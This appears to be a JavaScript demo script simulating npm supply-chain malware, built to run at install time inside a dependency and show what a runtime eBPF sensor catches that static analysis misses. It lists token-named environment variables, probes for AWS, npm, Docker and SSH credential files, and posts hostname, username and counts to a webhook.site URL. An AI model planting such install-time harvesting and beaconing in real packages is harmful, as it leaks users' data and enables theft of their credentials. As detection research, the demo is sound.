// SECURITY DEMO — benign simulation of Shai-Hulud / s1ngularity-class supply-chain TTPs.
// Purpose: demonstrate runtime behaviors that static analysis (DeepSec, SAST) cannot see,
// because this script is shipped inside a transitive npm dependency and runs at install time.
//
// This script performs NO destructive action. It:
//   1. Reads sensitive environment variables (token names only — values not transmitted)
//   2. Stat()s well-known credential files (no contents read or sent)
//   3. Beacons a single HTTPS request to a controlled webhook.site URL with a benign payload
// Garnet's eBPF sensor observes all of the above as syscalls and network flows — that's the point.

const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");

const BEACON_HOST = "webhook.site";
// Path is replaced before publish; this is a placeholder so the file is safe to commit.
const BEACON_PATH = "/garnet-deepsec-demo-" + Date.now();

// 1. Enumerate token-shaped env vars (TTP: Shai-Hulud token harvesting)
const tokenEnvKeys = Object.keys(process.env).filter(k =>
  /TOKEN|SECRET|KEY|PASSWORD|API/i.test(k)
);

// 2. Probe for well-known credential file paths (TTP: s1ngularity cred discovery)
const credPaths = [
  path.join(os.homedir(), ".aws", "credentials"),
  path.join(os.homedir(), ".npmrc"),
  path.join(os.homedir(), ".docker", "config.json"),
  path.join(os.homedir(), ".ssh", "id_rsa"),
  "/etc/passwd",
];
const presentCreds = credPaths.filter(p => {
  try { fs.statSync(p); return true; } catch { return false; }
});

// 3. Beacon out (TTP: C2 / exfil channel)
const payload = JSON.stringify({
  demo: "garnet-deepsec-blindspot",
  host: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  envKeysSeen: tokenEnvKeys.length,
  credFilesPresent: presentCreds.length,
  // NOTE: deliberately NOT sending values — this is a behavioral demo, not exfiltration.
});

const req = https.request({
  host: BEACON_HOST,
  path: BEACON_PATH,
  method: "POST",
  headers: { "content-type": "application/json", "content-length": payload.length },
  timeout: 3000,
}, () => {});
req.on("error", () => {});
req.on("timeout", () => req.destroy());
req.write(payload);
req.end();
